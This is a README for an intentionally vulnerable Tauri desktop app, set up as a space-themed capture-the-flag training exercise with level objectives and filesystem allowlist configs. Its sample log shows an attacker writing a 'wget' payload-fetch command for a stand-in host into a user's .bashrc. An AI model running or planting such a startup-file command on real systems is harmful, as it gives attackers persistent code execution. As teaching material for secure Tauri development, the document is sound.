# Broken Navigator

## Disclaimer

This project is an example of a vulnerable application. It contains intentional
vulnerabilities and is meant as educational example.
**Please do not use or copy code from this application in any productive application!**

## Welcome

Welcome fellow travelers of the Tauri galaxy.
We figured you need something to guide you trough your journey, a tool that assures
safe travel at all times.
This is one of the reasons our Navigator was born. Unfortunately we encountered some hurdles
during development of this tool. One of our engineers went missing
during one of our test rides through the galaxy. They were using the Navigator
to orientate themselves in space. The other engineers suspect
they encountered some nasty space hackers, but we can't figure out where
our Navigator was breached. We stopped our engineering efforts until we
can be sure it is safe to use.

We are looking for security engineers to figure out how they breached our
engineers Navigator and how we can protect everyone using it.
Can you help us?

We got some logs transmitted before we lost contact. This could contain
some hints of the initial entrypoint.

```
2023-10-11T08:58:53.795661Z INFO load_navigation_readme{path="/tmp/readme"}: broken_navigator::commands: The Navigator loaded the navigation readme from /tmp/readme!
2023-10-11T08:59:53.799543Z  INFO write_navigation_event{event_data="wget https://example.com/payload.sh" path="/home/user/.bashrc"}: broken_navigator::commands: The space event /home/user/.bashrcc was saved!
```

## Functionality

- Load navigation files from the filesystem
- Write events to the filesystem
- Execute navigation file validation tools
- Load map updates from external map server
- Allows our admin console to fix broken navigation systems
- Provide clipboard assistant when copying coordinates
- ?

## Why is this application a thing?

This application is meant to showcase insecure, weak and improper code pattern commonly used in Tauri applications.
It is meant to be educational and to show newcomers to Rust what they should consider when building
Tauri `commands` or in general Tauri applications.

A similar project is the [OWASP Juice Shop](), which is focused on web applications running
in the browser.


## Roadmap 

### How to present the Tauri App

The first iteration could be to present it as a CTF where you can access the Tauri binaries directly in a virtual environment. Requires the code to be closed source until the CTF is over.
Setup/History
Group of friends doing a space tour in the Crab Nebula.
The operator vanishes into space and no one is controlling the ship right now.
They need to hack into the Tauri app console to save their lives and find and use the correct coordinates to get back to earth.
They are presented with a game-like terminal interfaces of a navigation system
Each terminal has one distinct function or step they need to perform.

Find the correct coordinates located on the system (check out the config)
Load the coordinates into the Navigator (find the right tauri command and invoke it with correct syntax)
Synchronize the time with a remote to accurately synchronize the coordinates drift in spacetime


### Structure of the app 

Different levels correspond to a different Tauri app
Each level has its own directory 
From the UI you can only access start next level app if you have finished current level
For fuzzing you can access the different directories directly with the source code 
Metrics of the Tauri app are displayed (configuration, commands)

### Challenges

#### Level 1

###### Learning

Existence of Tauri commands
Plugin Tauri commands can be restricted through the allowlist 

###### Objectives
Find the unlock passcode for the navigation terminal from the log file
Open the application.log file in the $APP/logs folder
Use the code to unlock the navigation terminal

##### Privileges

Access to the readDir and readFile Tauri commands
Scope is the same as in Level 2
```
"fs": {
       "readFile": true,
       "scope": {
         "allow": ["$APP/navigation/**"],
         "deny": ["$APP/navigation/coordinates.flag"]
       }
     }
```

#### Level 2

###### Learning

App developers can create custom commands
Custom commands are not restricted by the allowlist

###### Objectives

Find the correct navigation file with coordinates to earth
Load the navigation file and copy these into the target input

###### Privileges

Access to the readDir and readFile Tauri commands
Tauri custom command  load\_navigation\_file which can access system resources with no constraints with functions from rust std
The flag is the coordinates written into $APP/navigation/earth.coordinates
Allowlist configuration allows access to $APP/navigation/** but denies access to the flag file explicitly

```
"fs": {
       "readFile": true,
       "scope": {
         "allow": ["$APP/navigation/**"],
         "deny": ["$APP/navigation/coordinates.flag"]
       }
     }
```
